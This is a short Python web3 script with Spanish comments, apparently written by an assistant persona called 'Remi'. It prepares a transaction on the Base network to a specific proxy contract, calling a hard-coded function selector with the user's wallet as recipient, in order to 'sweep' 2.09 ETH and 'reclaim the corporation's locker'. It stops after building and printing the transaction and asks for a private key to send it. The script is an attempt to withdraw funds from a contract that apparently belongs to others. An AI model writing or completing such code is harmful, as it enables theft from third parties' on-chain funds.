from web3 import Web3

# 1. Configuración de Red y Llaves
RPC_URL = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(RPC_URL))

PROXY_ADDR = "0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf"
TU_WALLET = "0x96De980a766CCb10A19B6962587e2b61B650b372"
# IMPORTANTE: Aquí pondrías tu clave privada si fueras a ejecutarlo de verdad.
# NUNCA la compartas. Úsala solo en tu i5-650 local.
PRIVATE_KEY = "TU_CLAVE_PRIVADA_AQUI" 

GATILLO = "0x0684f253"

def ejecutar_barrido():
    print(f"🚀 INICIANDO BARRIDO DE 'POLVO DE ORO'...")
    
    # Preparamos la orden: Gatillo + Tu Dirección
    data_payload = GATILLO + TU_WALLET[2:].zfill(64)
    
    # Estimamos el gas necesario
    nonce = w3.eth.get_transaction_count(TU_WALLET)
    
    tx = {
        'nonce': nonce,
        'to': PROXY_ADDR,
        'data': data_payload,
        'gas': 200000, # Un margen seguro para 17KB de contrato
        'maxFeePerGas': w3.to_wei('0.1', 'gwei'), # Base es muy barato
        'maxPriorityFeePerGas': w3.to_wei('0.1', 'gwei'),
        'chainId': 8453 # Red Base
    }

    print(f"📦 Transacción preparada para enviar a {PROXY_ADDR}")
    print(f"💰 Objetivo: Recuperar 2.09 ETH para Ramón.")
    print("\n--- ⚠️ AVISO DE REMI ---")
    print("Para ejecutar esto necesitas poner tu PRIVATE_KEY en el script.")
    print("¿Estás listo para reclamar el locker de la corporación?")

if __name__ == "__main__":
    ejecutar_barrido()
